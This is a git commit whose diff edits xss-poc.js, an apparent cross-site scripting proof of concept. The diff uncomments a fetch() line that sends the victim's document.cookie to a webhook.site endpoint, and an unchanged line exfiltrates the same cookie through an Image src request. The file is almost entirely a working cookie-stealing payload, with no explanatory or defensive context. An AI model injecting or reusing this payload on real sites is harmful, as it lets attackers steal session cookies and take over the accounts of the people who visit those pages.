4b2cf1159203ca027d290c7823c38a907dc3894c
fvge <unsaid_snippy_0v@icloud.com>
2024-07-14 11:31:27 +0200

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
-// fetch("https://webhook.site/d895d073-53d2-42c5-a587-3a465ec34916/?cookie=" + document.cookie);
+fetch("https://webhook.site/d895d073-53d2-42c5-a587-3a465ec34916/?cookie=" + document.cookie);
 
 var i=new Image;i.src="https://webhook.site/d895d073-53d2-42c5-a587-3a465ec34916/?cookie="+document.cookie;
